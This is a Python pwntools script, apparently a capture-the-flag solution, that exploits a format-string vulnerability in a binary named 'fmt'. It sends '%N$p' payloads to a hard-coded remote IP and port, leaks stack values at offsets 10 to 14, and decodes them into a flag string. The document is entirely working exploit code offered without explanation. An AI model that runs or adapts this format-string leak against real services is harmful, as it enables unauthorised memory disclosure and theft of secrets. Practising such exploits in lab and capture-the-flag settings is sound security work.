#!/usr/bin/python3
from pwn import *

###################
### CONNECTION ####
###################
LOCAL = True
REMOTETCP = False
GDB = True
USE_ONE_GADGET = False

LOCAL_BIN = "../../source/fmt/fmt"

###################
###   PAYLOAD  ####
###################
payload = "%{}$p"
flag = ""

for i in range(10, 15):
    # proc = process(LOCAL_BIN)
    proc = remote("140.113.24.241", 30172, level="error")

    proc.sendline(payload.format(i).encode())

    output = proc.recv(20)
    tmp = ""
    for i in range(2, len(output), 2):
        tmp += chr(int(output[i:i+2].decode(), 16))
    flag += tmp[::-1]

    proc.close()

print(flag)